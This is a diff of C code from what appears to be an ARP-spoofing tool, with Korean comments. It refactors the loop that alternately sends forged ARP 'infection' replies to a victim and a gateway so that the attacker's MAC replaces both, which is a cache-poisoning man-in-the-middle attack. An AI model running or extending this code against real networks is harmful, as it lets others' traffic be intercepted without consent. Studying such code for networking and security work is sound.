@@ -13,18 +13,16 @@ void *thread_infect(void *arg) //감염패킷킷
     struct eth_arp_header *infect = (struct eth_arp_header *)pkt;
 
     // 공격 대상과 Gateway에게 번갈아가며 감염 패킷 전송
-    int sw = 1;
+    char current = TARGET;
     while (1)
     {
-        if (sw > 2)
-            sw = 1;
-
-        if (sw == 1)
+        if (current == TARGET)
         {
             memcpy(infect->eth_dst_mac, infect_addr_save->save_target_mac, 6);
             infect->arp_sender_ip = infect_addr_save->save_gateway_ip;
             memcpy(infect->arp_target_mac, infect_addr_save->save_target_mac, 6);
             infect->arp_target_ip = infect_addr_save->save_target_ip;
+            current = GATEWAY;
         }
         else
         {
@@ -32,6 +30,7 @@ void *thread_infect(void *arg) //감염패킷킷
             infect->arp_sender_ip = infect_addr_save->save_target_ip;
             memcpy(infect->arp_target_mac, infect_addr_save->save_gateway_mac, 6);
             infect->arp_target_ip = infect_addr_save->save_gateway_ip;
+            current = TARGET;
         }
 
         memcpy(infect->eth_src_mac, mymac, 6);
@@ -44,7 +43,7 @@ void *thread_infect(void *arg) //감염패킷킷
         memcpy(infect->arp_sender_mac, mymac, 6);
 
         int res = pcap_sendpacket(pcap_handle, pkt, sizeof(pkt));
-        sw += 1;
+
         if (res == -1)
             printf(" error\n");
         else
